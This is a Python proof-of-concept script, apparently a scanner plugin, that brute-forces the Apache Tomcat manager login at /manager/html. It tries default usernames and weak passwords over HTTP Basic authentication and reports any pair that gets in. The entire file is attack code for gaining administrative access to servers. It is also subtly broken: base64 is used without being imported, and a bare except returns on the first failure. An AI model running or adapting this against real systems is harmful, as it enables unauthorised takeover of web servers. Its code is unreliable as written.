#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = carrypan

import requests
import urllib3

def poc(url):
    portlist = ['21','22','23','25','53','110','137','161','389','445','873','1090','1099','1433','1521','2049','2181','2222','2375','3306','3389','5432','5901','5984','6379','11211','27017']    
    if url.split(':')[1] in portlist:
        return False
    elif int(url.split(':')[1]) == 443:
        url = 'https://' + url.split(':')[0]
    elif int(url.split(':')[1]) == 8443:
        url = 'https://' + url
    else:
        url = 'http://' + url
    
    try:
        userlist = ["tomcat","admin"]
        passlist = ["tomcat", "123456", "admin", "111111"]
        payload = "/manager/html"
        vulnurl = url + payload
        for username in userlist:
            for password in passlist:
                try:
                    headers = {
                        "Authorization":"Basic "+base64.b64encode(bytes(username.encode())+b":"+bytes(password.encode())).decode(),
                        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
                    }
                    requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
                    req = requests.get(vulnurl, headers=headers, timeout=5, verify=False, allow_redirects=False)
                    if req.status_code == 200 and r"Applications" in req.text and r"Manager" in req.text:
                        weakinfo = username + ':' + password
                        return '[tomcat-weak-password]\t' + vulnurl + '\t' + weakinfo
                except:
                    return False
    except Exception:
        return False